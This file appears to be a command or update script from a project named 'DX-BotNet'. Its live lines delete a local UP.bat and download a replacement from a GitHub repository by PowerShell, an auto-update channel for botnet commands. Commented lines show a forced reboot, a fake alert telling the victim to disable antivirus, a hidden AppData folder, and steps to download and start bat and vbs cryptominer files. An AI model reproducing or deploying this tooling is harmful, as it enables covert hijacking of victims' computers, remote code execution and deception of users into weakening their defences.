#-------------TEST COMMANDS---------------#
#shutdown /r /t 00
#-------------AUTO UPDATE UP.bat SCRIPT---------------#
del UP.bat
powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDXT/DX-BotNet/main/UP.bat -OutFile UP.bat"
#taskkill /IM cmd.exe /F (Kill Update & Can run after One hour or after restart)
#msg %USERNAME% The antivirus program installed on your device may cause data corruption, it is advised to disable it as soon as possible to avoid possible damage!
#-------------EXA AUTO UPDATE UP.bat SCRIPT---------------#
#mkdir C:\Users\%USERNAME%\AppData\Roaming\Microsoft\All
#cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\All
#msg %USERNAME% The antivirus program installed on your device may cause data corruption, it is advised to disable it as soon as possible to avoid possible damage!
#timeout /t 1200 
# Download Bat file Miner
# Download vbs file Miner
#start filestart.vbs
#timeout /t 200
#taskkill /IM cmd.exe /F
#---------------UPDATE--------------#
exit
